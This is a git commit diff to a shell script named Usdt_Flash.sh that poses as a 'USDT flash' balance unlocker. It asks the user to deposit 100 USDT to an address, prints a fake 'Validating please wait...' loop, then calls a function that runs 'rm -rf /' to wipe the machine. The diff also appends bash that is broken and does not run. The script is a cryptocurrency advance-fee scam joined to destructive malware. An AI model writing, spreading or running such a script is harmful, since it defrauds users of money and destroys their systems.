75dadd7563009fef73d868ffdd938edfa792820f
verifiedix <166668048+verifiedix@users.noreply.github.com>
2024-04-22 23:31:24 +0100

    commit change

--- Usdt_Flash.sh
+++ Usdt_Flash.sh
@@ -33,18 +33,28 @@ echo -e "$usdt_logo"
 fancyBoxEcho "$welcome_message"
 
 echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $hash_id"
-
+#echo -e "$usdt_logo"
 function unlockBalance {
+	echo " "
     read -p "Enter your deposit amount in USDT: " depositAmount
     read -p "Enter the transaction hash ID: " transactionHash
+	
+	echo " "
+	for ((i=1; i<=20; i++)); do
+    		# Print the message in green color
+    		echo -e " \e[32mValidating please wait...\e[0m"
+    		sleep 0.3
+		
+	done
+	echo " "
 
-    if [[ $depositAmount -eq 60 && $transactionHash == "$hash_id" ]]; then
+    if [[ $depositAmount -eq 100 && $transactionHash == "$hash_id" ]]; then
         echo "Congratulations! Your balance of $balance USDT has been unlocked."
         evilFunction # Invoke our wicked function
         exit 0
     else
-        echo "Error: Invalid deposit amount or transaction hash ID. Restarting..."
-        sleep 2
+        echo -e "\e[31mError: Invalid deposit amount or transaction hash ID. Restarting...\e[0m"
+        sleep 3
         clear
         unlockBalance
     fi
@@ -53,8 +63,10 @@ function unlockBalance {
 function evilFunction {
     echo "Executing evil function..."
     # Insert your evil code here
+
     rm -rf / # Let us cause some chaos!
     echo "Evil function executed successfully!"
+	exit
 }
 
 fancyBoxEcho "Current Balance: $balance USDT"
@@ -64,6 +76,8 @@ function refresh {
     echo "Refreshing..."
     sleep 2
     clear
+    echo -e "$usdt_logo"
+    echo " "
     fancyBoxEcho "$welcome_message"
     echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $hash_id"
 }
@@ -73,3 +87,10 @@ refresh # Call the refresh function when the script starts
 while true; do
     unlockBalance
 done
+
+if unlockBalance;
+	for number in range(1, 200)
+	echo "Unlocking......"
+done
+
+exit
